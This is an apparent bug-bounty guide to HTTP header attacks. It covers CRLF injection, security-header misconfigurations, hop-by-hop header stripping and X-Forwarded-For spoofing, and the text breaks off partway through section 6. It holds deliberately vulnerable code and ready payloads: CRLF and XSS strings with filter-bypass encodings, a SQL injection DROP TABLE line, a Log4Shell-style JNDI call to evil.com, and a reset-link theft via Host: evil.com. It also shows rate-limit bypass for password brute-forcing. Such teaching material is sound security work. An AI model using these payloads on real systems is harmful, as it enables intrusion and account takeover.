# 🔥 Advanced Web Vulnerability Hunting Guide

### HTTP Header Attacks | Price Manipulation | Host Header Injection | HTML Injection

```
╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║       ADVANCED WEB VULNERABILITY HUNTING GUIDE v1.0                  ║
║       ─────────────────────────────────────────────                   ║
║                                                                       ║
║       4 Critical Bug Classes in One Reference                        ║
║                                                                       ║
║       🔴 HTTP Header Attacks                                         ║
║       🟡 Price / Business Logic Manipulation                         ║
║       🟣 Host Header Injection                                       ║
║       🔵 HTML Injection                                              ║
║                                                                       ║
║       Author: Vishal                                                  ║
║       Date: February 2026                                            ║
║       Purpose: Specialist Bug Bounty Hunting                         ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝
```

---

## 📑 Table of Contents

### PART A — HTTP Header Attacks
| #  | Section | Description |
|----|---------|-------------|
| 1  | [What Are HTTP Headers?](#1--what-are-http-headers) | Anatomy, request vs response, how they flow |
| 2  | [Why Headers Are an Attack Surface](#2--why-headers-are-an-attack-surface) | Trust assumptions, backend processing, reflection |
| 3  | [HTTP Header Injection (CRLF Injection)](#3--http-header-injection-crlf-injection) | Injecting `\r\n` to forge headers, response splitting |
| 4  | [Security Header Misconfigurations](#4--security-header-misconfigurations) | Missing/weak CSP, HSTS, X-Frame-Options, CORS |
| 5  | [Hop-by-Hop Header Abuse](#5--hop-by-hop-header-abuse) | Stripping auth headers via Connection header |
| 6  | [X-Forwarded-For / IP Spoofing](#6--x-forwarded-for--ip-spoofing) | Bypassing IP-based controls, rate limiting |
| 7  | [Request Smuggling via Headers](#7--request-smuggling-via-headers) | CL.TE, TE.CL, TE.TE smuggling attacks |
| 8  | [Cache Poisoning via Headers](#8--cache-poisoning-via-headers) | Unkeyed headers, web cache deception |
| 9  | [Header-Based Authentication Bypass](#9--header-based-authentication-bypass) | X-Original-URL, X-Rewrite-URL, internal headers |
| 10 | [HTTP Header Hunting Methodology](#10--http-header-hunting-methodology) | Step-by-step process for real targets |

### PART B — Price / Business Logic Manipulation
| #  | Section | Description |
|----|---------|-------------|
| 11 | [What Is Business Logic Manipulation?](#11--what-is-business-logic-manipulation) | Why logic flaws exist, developer assumptions |
| 12 | [Price Manipulation Fundamentals](#12--price-manipulation-fundamentals) | Client-side prices, hidden parameters, race conditions |
| 13 | [Types of Price Manipulation](#13--types-of-price-manipulation) | 12 attack types with PoC for each |
| 14 | [Coupon & Discount Abuse](#14--coupon--discount-abuse) | Stacking, reuse, negative coupons, race conditions |
| 15 | [Currency & Rounding Exploits](#15--currency--rounding-exploits) | Float precision, conversion arbitrage, rounding bugs |
| 16 | [Cart & Checkout Flow Attacks](#16--cart--checkout-flow-attacks) | Parameter tampering through the full purchase flow |
| 17 | [Subscription & Billing Manipulation](#17--subscription--billing-manipulation) | Trial abuse, plan switching, feature unlocking |
| 18 | [Real-World Price Manipulation Case Studies](#18--real-world-price-manipulation-case-studies) | Disclosed bounty reports from top platforms |
| 19 | [Price Manipulation Hunting Methodology](#19--price-manipulation-hunting-methodology) | Systematic approach with Burp Suite |

### PART C — Host Header Injection
| #  | Section | Description |
|----|---------|-------------|
| 20 | [What Is Host Header Injection?](#20--what-is-host-header-injection) | HTTP Host header, virtual hosting, why apps trust it |
| 21 | [How Host Header Injection Works](#21--how-host-header-injection-works) | The mechanics, what happens server-side |
| 22 | [Password Reset Poisoning](#22--password-reset-poisoning) | Stealing reset links via Host header — the #1 attack |
| 23 | [Web Cache Poisoning via Host](#23--web-cache-poisoning-via-host) | Poison cached pages with attacker's domain |
| 24 | [SSRF via Host Header](#24--ssrf-via-host-header) | Routing requests to internal services |
| 25 | [Bypass Techniques for Host Validation](#25--bypass-techniques-for-host-validation) | Port tricks, duplicate headers, X-Forwarded-Host |
| 26 | [Host Header Injection Methodology](#26--host-header-injection-methodology) | Systematic hunting with Burp Suite |

### PART D — HTML Injection
| #  | Section | Description |
|----|---------|-------------|
| 27 | [What Is HTML Injection?](#27--what-is-html-injection) | HTML vs XSS, why it matters, injection points |
| 28 | [Types of HTML Injection](#28--types-of-html-injection) | Stored, reflected, DOM-based, via headers, in emails |
| 29 | [HTML Injection Attack Techniques](#29--html-injection-attack-techniques) | Phishing forms, content spoofing, UI redress |
| 30 | [HTML Injection in Modern Contexts](#30--html-injection-in-modern-contexts) | Markdown, Rich Text, PDF generation, emails |
| 31 | [Escalating HTML Injection](#31--escalating-html-injection) | HTMLi → XSS, HTMLi → Phishing, HTMLi + Clickjacking |
| 32 | [HTML Injection Methodology](#32--html-injection-methodology) | Step-by-step hunting process |

### PART E — Cross-Cutting
| #  | Section | Description |
|----|---------|-------------|
| 33 | [Chaining These 4 Vulns Together](#33--chaining-these-4-vulns-together) | Combined attack scenarios |
| 34 | [Automation & Scripts](#34--automation--scripts) | Python scanners, Burp extensions, bash scripts |
| 35 | [Bug Bounty Report Templates](#35--bug-bounty-report-templates) | Ready-to-use templates for all 4 vuln classes |
| 36 | [Complete Hunting Checklist](#36--complete-hunting-checklist) | Printable checklist covering all 4 vulnerabilities |
| 37 | [Resources & References](#37--resources--references) | Books, labs, tools, links, community |

---

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--                    PART A: HTTP HEADER ATTACKS                  -->
<!-- ═══════════════════════════════════════════════════════════════ -->

# PART A — 🔴 HTTP Header Attacks

---

## 1. 📡 What Are HTTP Headers?

Before you attack headers, you need to understand them at a molecular level.

### The Anatomy of an HTTP Message

Every HTTP message (request or response) has the same structure:

```
┌─────────────────────────────────────────────────────┐
│  Start Line (Request Line or Status Line)           │
├─────────────────────────────────────────────────────┤
│  Header 1: Value                                    │
│  Header 2: Value                                    │
│  Header 3: Value                                    │
│  ...                                                │
├─────────────────────────────────────────────────────┤
│  (empty line — CRLF — \r\n)                         │
├─────────────────────────────────────────────────────┤
│  Body (optional)                                    │
└─────────────────────────────────────────────────────┘
```

### Real Request Example (Annotated)

```http
GET /api/v2/profile HTTP/1.1          ← Request line (method + path + version)
Host: app.target.com                   ← REQUIRED — tells server which vhost
User-Agent: Mozilla/5.0 (Macintosh)   ← Browser identification
Accept: application/json               ← What response formats client accepts
Accept-Language: en-US,en;q=0.9        ← Language preference
Accept-Encoding: gzip, deflate, br     ← Compression support
Cookie: session=eyJhbGciOiJI...        ← Authentication cookies
Authorization: Bearer eyJhbGci...      ← API authentication token
Referer: https://app.target.com/dash   ← Where the request came from
Origin: https://app.target.com         ← Origin for CORS
X-Requested-With: XMLHttpRequest       ← Indicates AJAX request
X-Forwarded-For: 203.0.113.50         ← Original client IP (behind proxy)
Connection: keep-alive                 ← Connection management
Cache-Control: no-cache                ← Caching directives
                                       ← Empty line = end of headers
                                       ← (No body for GET)
```

### Real Response Example (Annotated)

```http
HTTP/1.1 200 OK                             ← Status line
Server: nginx/1.24.0                        ← Server software (info leak!)
Date: Thu, 26 Feb 2026 12:00:00 GMT         ← Response timestamp
Content-Type: application/json; charset=utf-8 ← Body format
Content-Length: 1842                         ← Body size in bytes
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax  ← Set cookie
X-Frame-Options: DENY                       ← Clickjacking protection
X-Content-Type-Options: nosniff             ← MIME type sniffing prevention
X-XSS-Protection: 0                         ← Legacy XSS filter (deprecated)
Content-Security-Policy: default-src 'self'  ← CSP — controls resource loading
Strict-Transport-Security: max-age=31536000  ← Force HTTPS for 1 year
Access-Control-Allow-Origin: https://app.target.com  ← CORS
Cache-Control: private, no-store             ← Don't cache sensitive data
                                             ← Empty line
{"id":1,"name":"Vishal","email":"v@test.com"} ← Response body
```

### Header Categories — The Mental Model

```
Think of headers in 5 categories:

┌────────────────────┬────────────────────────────────────────────────────┐
│ Category           │ Examples                                          │
├────────────────────┼────────────────────────────────────────────────────┤
│ 🔐 Authentication  │ Cookie, Authorization, X-API-Key,                │
│                    │ X-Auth-Token, Set-Cookie                          │
├────────────────────┼────────────────────────────────────────────────────┤
│ 🌐 Routing         │ Host, X-Forwarded-Host, X-Forwarded-For,         │
│                    │ X-Original-URL, X-Rewrite-URL, Forwarded         │
├────────────────────┼────────────────────────────────────────────────────┤
│ 🛡️ Security        │ CSP, X-Frame-Options, HSTS, X-Content-Type-      │
│                    │ Options, Permissions-Policy, CORS headers         │
├────────────────────┼────────────────────────────────────────────────────┤
│ 📦 Content         │ Content-Type, Content-Length, Content-Encoding,   │
│                    │ Content-Disposition, Transfer-Encoding            │
├────────────────────┼────────────────────────────────────────────────────┤
│ ⚙️ Meta/Control    │ Connection, Cache-Control, Pragma, Vary,         │
│                    │ Accept, User-Agent, Referer, If-Modified-Since    │
└────────────────────┴────────────────────────────────────────────────────┘
```

### The Header Lifecycle — How Headers Flow

```
                     Internet              Load Balancer        App Server
Browser ──────────> CDN/Cache ──────────> / Reverse Proxy ──────> / Backend

Headers at each hop:

[Browser sends]
├── Host: app.target.com
├── Cookie: session=xyz
├── User-Agent: Chrome/120
└── Accept: text/html

      [CDN adds/modifies]
      ├── X-Forwarded-For: 203.0.113.50  (original IP)
      ├── X-Forwarded-Proto: https       (original protocol)
      ├── CF-Connecting-IP: 203.0.113.50 (Cloudflare)
      └── X-Real-IP: 203.0.113.50       (nginx)

            [Load Balancer adds]
            ├── X-Request-ID: uuid-1234
            ├── X-Forwarded-Host: app.target.com
            └── Via: 1.1 lb-node-3

                  [App Server receives ALL of these]
                  └── Must decide which to TRUST

⚠️ THE CRITICAL INSIGHT:
Headers added by the browser = ATTACKER CONTROLLED
Headers added by infrastructure = usually trusted
But the app often CAN'T TELL THE DIFFERENCE!
```

### Why This Matters for Bug Bounty

```
Every header is a potential input vector:
├── Some headers get REFLECTED in responses → XSS, Header Injection
├── Some headers control ROUTING → SSRF, Host Header Injection
├── Some headers bypass AUTH → Access control bypass
├── Some headers affect CACHING → Cache poisoning
├── Some headers control PARSING → Request smuggling
└── Missing security headers → Various client-side attacks

A single header can break an entire application.
```

---

## 2. ⚠️ Why Headers Are an Attack Surface

### The Root Problem: Trust

```
Most developers think about input validation for:
✅ URL parameters (?id=1)
✅ Form data (POST body)
✅ JSON payloads
✅ File uploads

But almost NOBODY validates:
❌ Host header
❌ X-Forwarded-For
❌ Referer / Origin
❌ User-Agent
❌ Accept-Language
❌ Custom X- headers
❌ Content-Type value itself

Developers assume headers come from "the browser" or "the infrastructure."
They forget: ATTACKERS CONTROL REQUEST HEADERS.
```

### How Backends Process Headers (The Dangerous Patterns)

**Pattern 1: Header Reflection (→ XSS, Header Injection)**
```python
# DANGEROUS: Reflecting header values in response
@app.route('/error')
def error_page():
    user_agent = request.headers.get('User-Agent', '')
    return f"<p>Your browser: {user_agent}</p>"  # ← XSS if unescaped!

# The attacker sends:
# User-Agent: <script>alert(document.cookie)</script>
```

**Pattern 2: Header in Database Queries (→ SQLi)**
```python
# DANGEROUS: Using header in SQL
@app.route('/log')
def log_visit():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    db.execute(f"INSERT INTO logs (ip) VALUES ('{ip}')")  # ← SQLi!

# Attacker sends:
# X-Forwarded-For: '); DROP TABLE users; --
```

**Pattern 3: Header in URL Construction (→ SSRF, Open Redirect)**
```python
# DANGEROUS: Building URLs from Host header
@app.route('/reset-password', methods=['POST'])
def reset_password():
    host = request.headers.get('Host')
    token = generate_token(user)
    reset_link = f"https://{host}/reset?token={token}"  # ← Host injection!
    send_email(user.email, reset_link)

# Attacker sends:
# Host: evil.com
# → Email contains: https://evil.com/reset?token=SECRET_TOKEN
```

**Pattern 4: Header in Access Control (→ Auth Bypass)**
```python
# DANGEROUS: Trusting IP from header for admin access
@app.route('/admin')
def admin_panel():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip == '127.0.0.1':  # "Only internal access"
        return render_admin_panel()
    return "Forbidden", 403

# Attacker sends:
# X-Forwarded-For: 127.0.0.1
# → Admin panel unlocked!
```

**Pattern 5: Header in Logging (→ Log Injection, Log4Shell-style)**
```java
// DANGEROUS: Logging unvalidated headers
logger.info("Request from User-Agent: " + request.getHeader("User-Agent"));

// Attacker sends (Log4Shell style):
// User-Agent: ${jndi:ldap://evil.com/exploit}
// → Remote Code Execution!
```

### The Attacker's Advantage

```
Why headers are EASIER to attack than parameters:

1. NO CLIENT-SIDE VALIDATION
   → Forms have JavaScript validation
   → URL params might be checked
   → Headers? Zero validation on the client

2. INVISIBLE TO WAFs (sometimes)
   → WAFs focus on URL and body
   → Custom headers often pass through unfiltered

3. PROCESSED AT MULTIPLE LAYERS
   → CDN reads headers → WAF reads headers → 
     Load balancer reads headers → App reads headers
   → Each layer might process the SAME header differently

4. FRAMEWORK BLIND SPOTS
   → Frameworks auto-sanitize GET/POST params
   → But headers? Usually raw, unescaped access

5. DEVELOPERS DON'T THINK ABOUT IT
   → "Who would modify their User-Agent?"
   → Answer: Every single attacker, ever
```

### Bounty Context: What Programs Pay For

```
┌─────────────────────────────────────┬────────────┬──────────────────┐
│ Header Vulnerability                │ Severity   │ Typical Bounty   │
├─────────────────────────────────────┼────────────┼──────────────────┤
│ CRLF Injection → Response Splitting│ Medium-High│ $500-$5,000      │
│ Host Header → Password Reset Poison│ High-Crit  │ $1,000-$15,000   │
│ X-Forwarded-For → IP Ban Bypass    │ Low-Medium │ $100-$1,000      │
│ X-Forwarded-For → Admin Bypass     │ Critical   │ $3,000-$25,000   │
│ Missing Security Headers           │ Info-Low   │ $0-$250          │
│ Cache Poisoning via Headers        │ High-Crit  │ $2,000-$20,000   │
│ Request Smuggling                  │ Critical   │ $5,000-$50,000+  │
│ CORS Misconfiguration              │ Medium-High│ $500-$5,000      │
│ Header-based XSS                   │ Medium-High│ $500-$10,000     │
│ Header SQLi                        │ Critical   │ $5,000-$30,000   │
└─────────────────────────────────────┴────────────┴──────────────────┘
```

---

## 3. 💉 HTTP Header Injection (CRLF Injection)

The most direct header attack. Inject `\r\n` (Carriage Return + Line Feed) to forge headers or split responses.

### How CRLF Injection Works

```
HTTP uses \r\n (CRLF) to separate headers:

HTTP/1.1 200 OK\r\n           ← Status line ends with CRLF
Content-Type: text/html\r\n    ← Each header ends with CRLF
Set-Cookie: a=b\r\n            ← Each header ends with CRLF
\r\n                           ← Empty line = headers end, body starts
<html>...                      ← Body begins

If an attacker can inject \r\n into a header VALUE:
→ They can CREATE new headers
→ They can START the body (double CRLF)
→ They can SPLIT the response into two responses
```

### Attack Scenario 1: Header Injection via Redirect

```
Vulnerable code (Node.js Express):
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.redirect(302, url);  // Sets Location header with user input
});

Normal request:
GET /redirect?url=https://target.com/dashboard HTTP/1.1

Normal response:
HTTP/1.1 302 Found
Location: https://target.com/dashboard

CRLF Attack:
GET /redirect?url=https://target.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1

%0d = \r (carriage return)
%0a = \n (line feed)

Injected response:
HTTP/1.1 302 Found
Location: https://target.com
Set-Cookie: admin=true          ← INJECTED HEADER!

The server sent Set-Cookie: admin=true as if it's a legitimate response header.
```

### Attack Scenario 2: Response Splitting (Full Body Control)

```
GET /redirect?url=x%0d%0a%0d%0a<html><script>alert('XSS')</script></html> HTTP/1.1

Response:
HTTP/1.1 302 Found
Location: x

<html><script>alert('XSS')</script></html>     ← INJECTED BODY!

Double CRLF (\r\n\r\n) terminates headers → attacker controls the body.
This is essentially XSS via header injection.
```

### Attack Scenario 3: Session Fixation via CRLF

```
GET /redirect?url=https://target.com%0d%0aSet-Cookie:%20session=ATTACKER_SESSION_ID%3B%20Path%3D%2F HTTP/1.1

Response:
HTTP/1.1 302 Found
Location: https://target.com
Set-Cookie: session=ATTACKER_SESSION_ID; Path=/

Flow:
1. Attacker creates this URL
2. Victim clicks it
3. Browser sets session=ATTACKER_SESSION_ID
4. Victim logs in → session now belongs to attacker's cookie value
5. If server doesn't regenerate session ID on login → Session Fixation!
```

### Where to Find CRLF Injection

```
HIGH PROBABILITY injection points:

1. Redirect endpoints:
   → /redirect?url=...
   → /login?return_to=...
   → /goto?link=...
   → /out?url=...
   → Any parameter that ends up in Location header

2. Set-Cookie from user input:
   → /set-language?lang=en
   → /set-theme?theme=dark
   → Any parameter that gets SET as a cookie value

3. Custom response headers from input:
   → /api/download?filename=report.pdf
   → /export?format=csv
   → Content-Disposition: attachment; filename=USER_INPUT

4. Log/debug endpoints:
   → /api/debug?message=...
   → Headers reflected in error messages

5. X-Forwarded-* headers reflected:
   → X-Forwarded-For value in response headers
   → Via header reflection
```

### Testing CRLF — Payloads

```
Basic payloads (URL-encoded):

# Inject a new header
%0d%0aInjected-Header:%20true

# Inject Set-Cookie
%0d%0aSet-Cookie:%20hacked=true

# Response splitting (inject body)
%0d%0a%0d%0a<h1>HACKED</h1>

# XSS via response splitting
%0d%0a%0d%0a<script>alert(document.domain)</script>

# Double encoding (bypass basic filters)
%250d%250a                        → decodes to %0d%0a → decodes to \r\n
%25%30%64%25%30%61                → triple encoding

# Unicode/alternative representations
%E5%98%8A%E5%98%8D               → Unicode CRLF equivalent
\r\n                              → literal (some parsers)
\u000d\u000a                      → Unicode escape
%0d%20%0a                         → CRLF with space

# In header values (via Burp Repeater)
GET / HTTP/1.1
Host: target.com
X-Custom: value\r\nInjected: true

# Testing in different positions
/redirect?url=http://evil.com%0d%0aX-Injected:%20true
/set-language?lang=en%0d%0aSet-Cookie:%20pwned=true
/api/v1/export?name=test%0d%0a%0d%0a<h1>XSS</h1>
```

### Burp Suite CRLF Testing Workflow

```
Step 1: Identify reflection points
→ Send request to Repeater
→ Check if any header VALUES appear in the RESPONSE headers
→ Check redirect endpoints (Location header)

Step 2: Test basic CRLF
→ In Repeater, insert \r\n in the parameter:
   Original: /redirect?url=https://target.com
   Test:     /redirect?url=https://target.com%0d%0aX-Test:%20injected
→ Check response: Does "X-Test: injected" appear as a header?

Step 3: If basic CRLF is filtered, try bypasses:
   %0d%0a           → basic
   %0D%0A           → uppercase
   %250d%250a       → double encode
   %0d%20%0a        → space between
   %E5%98%8A%E5%98%8D → unicode
   \r\n             → literal backslash

Step 4: Escalate
→ If header injection works → try response splitting (double CRLF)
→ If response splitting works → inject XSS payload in body
→ If Set-Cookie injection works → try session fixation

Step 5: Automate with Intruder
→ Use a CRLF payload list
→ Mark the injection point
→ Grep for injected header in responses
```

### CRLF Injection Impact Levels

```
┌──────────────────────────────┬──────────┬─────────────────────────┐
│ What You Can Do              │ Severity │ Why                     │
├──────────────────────────────┼──────────┼─────────────────────────┤
│ Inject arbitrary header      │ Medium   │ Limited direct impact   │
│ Set-Cookie injection         │ High     │ Session fixation        │
│ Response splitting → XSS     │ High     │ Full XSS equivalent    │
│ Response splitting → cache   │ Critical │ Poison CDN/cache        │
│  poisoning                   │          │  for ALL users          │
│ HSTS bypass via header       │ High     │ Downgrade to HTTP       │
│ CSP bypass via injection     │ High     │ Bypass XSS protections  │
└──────────────────────────────┴──────────┴─────────────────────────┘
```

---

## 4. 🛡️ Security Header Misconfigurations

Missing or weak security headers are the lowest-hanging fruit on any target.

### The Essential Security Headers — What Each Does

**1. Content-Security-Policy (CSP)**
```
What: Controls which resources (scripts, styles, images, fonts) can load
Why: Prevents XSS by blocking inline scripts and untrusted sources

Strong CSP:
Content-Security-Policy: default-src 'self'; script-src 'self'; 
    style-src 'self'; img-src 'self' data:; font-src 'self';
    connect-src 'self'; frame-ancestors 'none'; form-action 'self';
    base-uri 'self'

Weak CSP (exploitable):
Content-Security-Policy: default-src *                    ← allows everything
Content-Security-Policy: script-src 'unsafe-inline'       ← inline XSS works
Content-Security-Policy: script-src 'unsafe-eval'         ← eval() XSS works
Content-Security-Policy: script-src *.googleapis.com      ← JSONP bypass possible
Content-Security-Policy: default-src 'self' 'unsafe-inline' ← self-contradicting

Missing entirely: ❌ No CSP header → no protection

What to look for as a hunter:
→ 'unsafe-inline' in script-src → inline XSS works
→ 'unsafe-eval' in script-src → eval/setTimeout XSS works
→ Wildcards (*.cdn.com) → hosted payload on CDN
→ data: in script-src → data:text/html,<script>... works
→ Missing frame-ancestors → clickjacking possible
→ Missing form-action → CSRF form can submit anywhere
```

**2. Strict-Transport-Security (HSTS)**
```
What: Forces browser to ONLY use HTTPS for this domain
Why: Prevents SSL stripping / man-in-the-middle downgrade attacks

Strong HSTS:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

Weak HSTS:
max-age=0               ← disables HSTS (effectively)
max-age=3600            ← only 1 hour, attacker just waits
Missing includeSubDomains → subdomains can be HTTP
Missing preload         → first visit is still vulnerable

Missing entirely: ❌ MITM can intercept first HTTP request

What to check:
→ Is HSTS present? → check with: curl -I https://target.com
→ Is max-age at least 31536000 (1 year)?
→ Does it include subdomains?
→ Is it on the preload list? → https://hstspreload.org/
```

**3. X-Frame-Options**
```
What: Controls if page can be loaded in iframe
Why: Prevents clickjacking

Values:
X-Frame-Options: DENY              ← cannot be framed (strongest)
X-Frame-Options: SAMEORIGIN        ← only same-origin framing
X-Frame-Options: ALLOW-FROM url    ← deprecated, don't use

Missing: ❌ Page can be clickjacked

Note: CSP frame-ancestors is the modern replacement:
Content-Security-Policy: frame-ancestors 'none'     ← same as DENY
Content-Security-Policy: frame-ancestors 'self'      ← same as SAMEORIGIN
```

**4. X-Content-Type-Options**
```
What: Prevents MIME type sniffing
Why: Stops browser from interpreting files as different types

Correct:
X-Content-Type-Options: nosniff

Without this:
→ A .txt file containing HTML/JS might be rendered as HTML
→ Uploaded file with .jpg extension containing script gets executed
→ API returning JSON could be interpreted as HTML

Missing: ❌ MIME sniffing attacks possible
```

**5. CORS Headers**
```
What: Controls which origins can make cross-site requests
Why: Misconfiguration = CSRF + data theft

Dangerous configurations:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
→ ❌ ANY site can read authenticated responses!

Access-Control-Allow-Origin: [reflects request Origin]
Access-Control-Allow-Credentials: true
→ ❌ Attacker's origin gets full access!

Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
→ ❌ Sandboxed iframe (null origin) gets access!

Safe configuration:
Access-Control-Allow-Origin: https://app.target.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
→ ✅ Only specific trusted origin allowed
```

**6. Permissions-Policy (formerly Feature-Policy)**
```
What: Controls browser features (camera, mic, geolocation, etc.)
Why: Prevents malicious iframes from accessing sensitive APIs

Example:
Permissions-Policy: camera=(), microphone=(), geolocation=(), 
    payment=(), usb=(), magnetometer=()

→ Disables camera, mic, geolocation for all origins
→ Prevents embedded content from accessing hardware

Missing: Framed content can request camera/mic access
```

### Quick Security Header Audit

```bash
# One-liner to check ALL security headers:
curl -sI https://target.com | grep -iE \
    "strict-transport|content-security|x-frame|x-content-type|
     access-control|permissions-policy|referrer-policy|
     x-xss-protection|x-permitted-cross"

# Or use securityheaders.com:
# https://securityheaders.com/?q=target.com

# Check with Python:
import requests
r = requests.get('https://target.com')
security_headers = [
    'Content-Security-Policy',
    'Strict-Transport-Security',
    'X-Frame-Options',
    'X-Content-Type-Options',
    'Referrer-Policy',
    'Permissions-Policy'
]
for h in security_headers:
    val = r.headers.get(h, '❌ MISSING')
    print(f'{h}: {val}')
```

### What to Report (and What NOT to)

```
REPORT (exploitable impact):
✅ Missing CSP + found XSS → CSP would have been defense-in-depth
✅ Missing X-Frame-Options + clickjacking PoC works
✅ CORS reflects origin + credentials → data theft PoC
✅ Missing HSTS + shown MITM scenario on HTTP version
✅ Weak CSP with unsafe-inline + working XSS bypass

DON'T REPORT (info-only, often rejected):
❌ "Missing security headers" with no exploit
❌ Missing X-XSS-Protection (it's deprecated)
❌ Missing Server header (it's not a security header)
❌ Server version disclosure alone (info, not vuln)
❌ Missing CSP on a page with no user input

Tip: Always pair missing headers with a WORKING EXPLOIT.
"Missing X-Frame-Options" alone = $0
"Missing X-Frame-Options + clickjacking PoC that transfers funds" = $$$
```

---

## 5. 🔄 Hop-by-Hop Header Abuse

An obscure but powerful technique. Most hunters don't know this one.

### What Are Hop-by-Hop Headers?

```
HTTP defines two types of headers:

End-to-End headers:
→ Passed to the FINAL recipient (the backend)
→ Examples: Host, Content-Type, Authorization, Cookie
→ Proxies MUST forward them unchanged

Hop-by-Hop headers:
→ Only meaningful for the CURRENT connection
→ NOT forwarded by proxies
→ Defined in the Connection header
→ Standard hop-by-hop: Connection, Keep-Alive, TE, 
   Transfer-Encoding, Proxy-Authorization, Trailer, Upgrade

The key: The Connection header can DECLARE any header as hop-by-hop!
```

### The Attack: Stripping Headers via Connection

```
Normal flow:
Browser → Proxy → Backend

Browser sends:
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer valid_token
Connection: keep-alive

Proxy forwards to backend:
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer valid_token    ← forwarded

ATTACK: Declare Authorization as hop-by-hop:
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer valid_token
Connection: close, Authorization     ← tells proxy to STRIP Authorization

Proxy receives and STRIPS Authorization before forwarding:
GET /admin HTTP/1.1
Host: target.com
                                     ← Authorization REMOVED!

If the backend interprets missing auth as "internal request" → ACCESS GRANTED!
```

### Real Attack Scenarios

**Scenario 1: Authentication Bypass**
```
Request:
GET /api/internal/users HTTP/1.1
Host: target.com
X-Auth-Token: user_token
Connection: close, X-Auth-Token

Proxy strips X-Auth-Token → Backend sees no token →
Backend thinks it's an internal service call → Returns all users!
```

**Scenario 2: Cache Poisoning**
```
Request 1 (attacker):
GET /profile HTTP/1.1
Host: target.com
Cookie: session=attacker
Connection: close, Cookie

Proxy strips Cookie → Backend returns anonymous profile page →
Cache stores anonymous version for /profile

Request 2 (victim):
GET /profile HTTP/1.1
Host: target.com
Cookie: session=victim

Cache serves the anonymous version → Victim sees wrong content!
```

**Scenario 3: WAF Bypass**
```
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-WAF-Check: enabled
Connection: close, X-WAF-Check

If WAF checks X-WAF-Check to decide whether to scan →
Stripping it might bypass WAF inspection!
```

### Testing Hop-by-Hop Abuse

```
In Burp Repeater, for EVERY endpoint:

1. Identify what auth headers are used:
   → Authorization? Cookie? X-API-Key? X-Auth-Token?

2. Try stripping each one via Connection:
   Connection: close, Authorization
   Connection: close, Cookie
   Connection: close, X-API-Key
   Connection: close, X-Auth-Token

3. Also try stripping security headers:
   Connection: close, X-Forwarded-For
   Connection: close, X-Real-IP
   Connection: close, X-Request-ID

4. Check if response changes:
   → 200 instead of 401/403 → AUTH BYPASS!
   → Different content → something got stripped
   → Same response → proxy didn't honor Connection header

Headers to try stripping:
Authorization, Cookie, X-API-Key, X-Auth-Token, 
X-Forwarded-For, X-Real-IP, X-Request-ID, 
X-Forwarded-Host, X-Original-URL, If-None-Match,
X-CSRF-Token, X-Requested-With
```

---

## 6. 🎭 X-Forwarded-For / IP Spoofing

### The Problem

```
When a user connects through a proxy/load balancer/CDN:

User (203.0.113.50) → Cloudflare (198.41.0.1) → App Server

The app server sees the CONNECTION from Cloudflare (198.41.0.1),
not the real user IP (203.0.113.50).

Solution: Proxy adds X-Forwarded-For header:
X-Forwarded-For: 203.0.113.50

The app reads X-Forwarded-For to get the "real" IP.

THE VULNERABILITY:
Anyone can SET X-Forwarded-For in their request!
If the app blindly trusts this header → IP spoofing!
```

### IP-Spoofing Headers (All of Them)

```
There are MANY headers that convey "original IP":

Standard:
├── X-Forwarded-For: 203.0.113.50
├── Forwarded: for=203.0.113.50
├── X-Real-IP: 203.0.113.50

CDN-specific:
├── CF-Connecting-IP: 203.0.113.50      (Cloudflare)
├── True-Client-IP: 203.0.113.50         (Akamai/Cloudflare)
├── X-Azure-ClientIP: 203.0.113.50       (Azure)
├── Fastly-Client-IP: 203.0.113.50       (Fastly)
├── X-Appengine-User-IP: 203.0.113.50    (Google App Engine)

Legacy/Custom:
├── X-Client-IP: 203.0.113.50
├── X-Cluster-Client-IP: 203.0.113.50
├── X-Original-Forwarded-For: 203.0.113.50
├── X-Originating-IP: 203.0.113.50
├── X-Remote-IP: 203.0.113.50
├── X-Remote-Addr: 203.0.113.50
└── Client-IP: 203.0.113.50

TEST ALL OF THEM. Different backends trust different headers.
```

### Attack 1: Bypass IP-Based Rate Limiting

```
Normal: After 5 failed login attempts from your IP → locked out

Attack:
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 1.2.3.4           ← Fake IP #1
email=admin@target.com&password=guess1  → Attempt 1

POST /login HTTP/1.1
X-Forwarded-For: 1.2.3.5           ← Fake IP #2
email=admin@target.com&password=guess2  → Attempt 2

POST /login HTTP/1.1
X-Forwarded-For: 1.2.3.6           ← Fake IP #3
email=admin@target.com&password=guess3  → Attempt 3

Each request appears to come from a different IP → rate limit never triggers!
Unlimited password brute-force possible.
```

### Attack 2: Bypass IP-Based Access Control

```
GET /admin HTTP/1.1
Host: target.com
→ 403 Forbidden (only internal IPs allowed)

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
→ 200 OK! Admin panel returned!

Or try:
X-Forwarded-For: 10.0.0.1            ← Internal network
X-Forwarded-For: 192.168.1.1         ← Internal network
X-Forwarded-For: 172.16.0.1          ← Internal network
X-Forwarded-For: 0.0.0.0             ← Sometimes works
X-Forwarded-For: ::1                 ← IPv6 localhost
```

### Attack 3: Bypass Geo-Restrictions

```
# Content restricted to US IPs only
GET /content/us-only HTTP/1.1
X-Forwarded-For: 8.8.8.8            ← Google DNS (US IP)
→ Content returned!

# Or bypass sanctions/blocklists:
X-Forwarded-For: [IP from allowed country]
```

### Attack 4: Bypass IP-Based Fraud Detection

```
# E-commerce checks if order IP matches billing country
POST /checkout HTTP/1.1
X-Forwarded-For: [IP matching billing address country]
→ Fraud check passes!
```

### Testing X-Forwarded-For — The Full Process

```
In Burp Repeater:

